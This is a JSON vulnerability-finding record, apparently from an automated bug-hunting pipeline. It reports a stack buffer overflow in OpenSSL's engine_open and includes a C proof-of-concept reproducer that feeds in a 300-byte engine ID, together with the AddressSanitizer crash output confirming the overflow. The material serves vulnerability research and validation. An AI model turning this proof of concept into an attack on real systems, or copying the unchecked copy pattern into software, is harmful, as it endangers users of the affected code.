@@ -1,0 +1,60 @@
+{
+  "baseline": "B3",
+  "vulnerability": {
+    "file": "apps/lib/engine_loader.c",
+    "line": 86,
+    "function": "engine_open",
+    "bug_type": "stack-buffer-overflow",
+    "cwe": "CWE-121",
+    "confidence": "high",
+    "explanation": "Copies an unbounded-length engine ID into a fixed 256-byte stack buffer without checking length. engineid_l is computed as q - p and may exceed 255; strncpy(engineid, p, engineid_l) overflows engineid, and the subsequent engineid[engineid_l] = '\\0' write also goes out of bounds when engineid_l >= 256. An attacker can trigger this with a URI having an engine ID >255 bytes before the next ':'.",
+    "abs_path": "/tmp/openssl_upstream/apps/lib/engine_loader.c"
+  },
+  "reproducer_code": "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\n/* Minimal stub types to satisfy the vulnerable code */\ntypedef struct ENGINE_st {\n    int dummy;\n} ENGINE;\n\ntypedef struct OSSL_STORE_LOADER_st {\n    int dummy;\n} OSSL_STORE_LOADER;\n\ntypedef struct UI_METHOD_st {\n    int dummy;\n} UI_METHOD;\n\ntypedef struct OSSL_STORE_LOADER_CTX_st {\n    ENGINE *e;\n    char *keyid;\n    int expected;\n    int loaded;\n} OSSL_STORE_LOADER_CTX;\n\n/* OpenSSL-like helper stubs */\nstatic void *OPENSSL_zalloc(size_t n) { return calloc(1, n); }\nstatic void OPENSSL_free(void *p) { free(p); }\nstatic char *OPENSSL_strdup(const char *s) { return s ? strdup(s) : NULL; }\n\nstatic void ENGINE_free(ENGINE *e) { free(e); }\nstatic ENGINE *ENGINE_by_id(const char *id) {\n    /* Stub: pretend we didn't find the engine to keep things simple */\n    (void)id;\n    return NULL;\n}\n\nstatic OSSL_STORE_LOADER_CTX *OSSL_STORE_LOADER_CTX_new(ENGINE *e, char *keyid)\n{\n    OSSL_STORE_LOADER_CTX *ctx = (OSSL_STORE_LOADER_CTX *)OPENSSL_zalloc(sizeof(*ctx));\n    if (ctx != NULL) {\n        ctx->e = e;\n        ctx->keyid = keyid;\n    }\n    return ctx;\n}\n\nstatic void OSSL_STORE_LOADER_CTX_free(OSSL_STORE_LOADER_CTX *ctx)\n{\n    if (ctx != NULL) {\n        ENGINE_free(ctx->e);\n        OPENSSL_free(ctx->keyid);\n        OPENSSL_free(ctx);\n    }\n}\n\n#define ENGINE_SCHEME_COLON \"engine:\"\n#define CHECK_AND_SKIP_CASE_PREFIX(p, prefix) \\\n    (strncmp((p), (prefix), strlen(prefix)) == 0 ? ((p) += strlen(prefix), 1) : 0)\n\n/* Vulnerable function reproduced from the target source (with minimal surrounding stubs) */\nstatic OSSL_STORE_LOADER_CTX *engine_open(const OSSL_STORE_LOADER *loader,\n    const char *uri,\n    const UI_METHOD *ui_method,\n    void *ui_data)\n{\n    const char *p = uri, *q;\n    ENGINE *e = NULL;\n    char *keyid = NULL;\n    OSSL_STORE_LOADER_CTX *ctx = NULL;\n\n    (void)loader;\n    (void)ui_method;\n    (void)ui_data;\n\n    if (!CHECK_AND_SKIP_CASE_PREFIX(p, ENGINE_SCHEME_COLON))\n        return NULL;\n\n    /* Look for engine ID */\n    q = strchr(p, ':');\n    if (q != NULL /* There is both an engine ID and a key ID */\n        && p[0] != ':' /* The engine ID is at least one character */\n        && q[1] != '\\0') { /* The key ID is at least one character */\n        char engineid[256];\n        size_t engineid_l = (size_t)(q - p);\n\n        /* BUG: engineid_l may exceed sizeof(engineid)-1, causing overflow */\n        strncpy(engineid, p, engineid_l);\n        engineid[engineid_l] = '\\0';\n        e = ENGINE_by_id(engineid);\n\n        keyid = OPENSSL_strdup(q + 1);\n    }\n\n    if (e != NULL && keyid != NULL)\n        ctx = OSSL_STORE_LOADER_CTX_new(e, keyid);\n\n    if (ctx == NULL) {\n        OPENSSL_free(keyid);\n        ENGINE_free(e);\n    }\n\n    return ctx;\n}\n\nint main(void)\n{\n    /* Craft a URI with an engine ID > 255 bytes to overflow the 256-byte buffer */\n    const char *scheme = ENGINE_SCHEME_COLON; /* \"engine:\" */\n    size_t long_id_len = 300; /* > 255 to trigger overflow */\n    const char *keyid = \":K\"; /* minimal non-empty key id */\n\n    size_t uri_len = strlen(scheme) + long_id_len + strlen(keyid);\n    char *uri = (char *)malloc(uri_len + 1);\n    if (!uri) {\n        perror(\"malloc\");\n        return 1;\n    }\n\n    /* Build: \"engine:\" + 300 x 'A' + \":K\" */\n    char *w = uri;\n    memcpy(w, scheme, strlen(scheme));\n    w += strlen(scheme);\n    memset(w, 'A', long_id_len);\n    w += long_id_len;\n    memcpy(w, keyid, strlen(keyid));\n    w += strlen(keyid);\n    *w = '\\0';\n\n    /* Call the vulnerable function; AddressSanitizer should report stack-buffer-overflow */\n    OSSL_STORE_LOADER_CTX *ctx = engine_open(NULL, uri, NULL, NULL);\n\n    /* Cleanup (not reached if ASan aborts due to detected overflow on function epilogue) */\n    OSSL_STORE_LOADER_CTX_free(ctx);\n    free(uri);\n\n    return 0;\n}\n",
+  "validation": {
+    "verdict": "CONCRETE_CONFIRMED",
+    "asan": {
+      "asan_triggered": true,
+      "exit_code": 1,
+      "elapsed": 0.9745016098022461,
+      "output": "=================================================================\n==4134804==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7fffa5e0d460 at pc 0x65070d7cbdb1 bp 0x7fffa5e0d330 sp 0x7fffa5e0caf0\nWRITE of size 300 at 0x7fffa5e0d460 thread T0\n    #0 0x65070d7cbdb0 in __interceptor_strncpy (/app/se_runs/b3/openssl_67b5686b_vul/findings/engine_loader_86_stack-buffer-overflow/reproducer+0x8fdb0) (BuildId: 95f1c0b5de3c8874a3094069789ae2d4966d874c)\n    #1 0x65070d81d137 in engine_open /app/se_runs/b3/openssl_67b5686b_vul/findings/engine_loader_86_stack-buffer-overflow/reproducer.c:87:9\n    #2 0x65070d81ce2f in main /app/se_runs/b3/openssl_67b5686b_vul/findings/engine_loader_86_stack-buffer-overflow/reproducer.c:130:34\n    #3 0x76a57702a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16\n    #4 0x76a57702a28a in __libc_start_main csu/../csu/libc-start.c:360:3\n    #5 0x65070d75d314 in _start (/app/se_runs/b3/openssl_67b5686b_vul/findings/engine_loader_86_stack-buffer-overflow/reproducer+0x21314) (BuildId: 95f1c0b5de3c8874a3094069789ae2d4966d874c)\n\nAddress 0x7fffa5e0d460 is located in stack of thread T0 at offset 288 in frame\n    #0 0x65070d81ce6f in engine_open /app/se_runs/b3/openssl_67b5686b_vul/findings/engine_loader_86_stack-buffer-overflow/reproducer.c:65\n\n  This frame has 1 object(s):\n    [32, 288) 'engineid' (line 83) <== Memory access at offset 288 overflows this variable\nHINT: this may be a false positive if your program uses some custom stack unwind mechanism, swapcontext or vfork\n      (longjmp and C++ exceptions *are* supported)\nSUMMARY: AddressSanitizer: stack-buffer-overflow (/app/se_runs/b3/openssl_67b5686b_vul/findings/engine_loader_86_stack-buffer-overflow/reproducer+0x8fdb0) (BuildId: 95f1c0b5de3c8874a3094069789ae2d4966d874c) in __interceptor_strncpy\nShadow bytes around the buggy address:\n  0x100074bb9a30: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x100074bb9a40: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x100074bb9a50: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x100074bb9a60: 00 00 00 00 00 00 00 00 f1 f1 f1 f1 00 00 00 00\n  0x100074bb9a70: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n=>0x100074bb9a80: 00 00 00 00 00 00 00 00 00 00 00 00[f3]f3 f3 f3\n  0x100074bb9a90: f3 f3 f3 f3 00 00 00 00 00 00 00 00 00 00 00 00\n  0x100074bb9aa0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x100074bb9ab0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x100074bb9ac0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x100074bb9ad0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\nShadow byte legend (one shadow byte represents 8 application bytes):\n  Addressable:           00\n  Partially addressable: 01 02 03 04 05 06 07 \n  Heap left redzone:       fa\n  Freed heap region:       fd\n  Stack left redzone:      f1\n  Stack mid redzone:       f2\n  Stack right redzone:     f3\n  Stack after return:      f5\n  Stack use after scope:   f8\n  Global redzone:          f9\n  Global init order:       f6\n  Poisoned by user:        f7\n  Container overflow:      fc\n  Array cookie:            ac\n  Intra object redzone:    bb\n  ASan internal:           fe\n  Left alloca redzone:     ca\n  Right alloca redzone:    cb\n==4134804==ABORTING\n",
+      "error_type": "stack-buffer-overflow",
+      "crash_function": "engine_open",
+      "crash_file": "/app/se_runs/b3/openssl_67b5686b_vul/findings/engine_loader_86_stack-buffer-overflow/reproducer.c",
+      "crash_line": 65,
+      "frames": [
+        [
+          "1",
+          "engine_open",
+          "/app/se_runs/b3/openssl_67b5686b_vul/findings/engine_loader_86_stack-buffer-overflow/reproducer.c:87",
+          "9"
+        ],
+        [
+          "2",
+          "main",
+          "/app/se_runs/b3/openssl_67b5686b_vul/findings/engine_loader_86_stack-buffer-overflow/reproducer.c:130",
+          "34"
+        ],
+        [
+          "3",
+          "__libc_start_call_main",
+          "csu/../sysdeps/nptl/libc_start_call_main.h:58",
+          "16"
+        ],
+        [
+          "4",
+          "__libc_start_main",
+          "csu/../csu/libc-start.c:360",
+          "3"
+        ],
+        [
+          "0",
+          "engine_open",
+          "/app/se_runs/b3/openssl_67b5686b_vul/findings/engine_loader_86_stack-buffer-overflow/reproducer.c",
+          "65"
+        ]
+      ],
+      "is_harness_artifact": false
+    }
+  }
+}
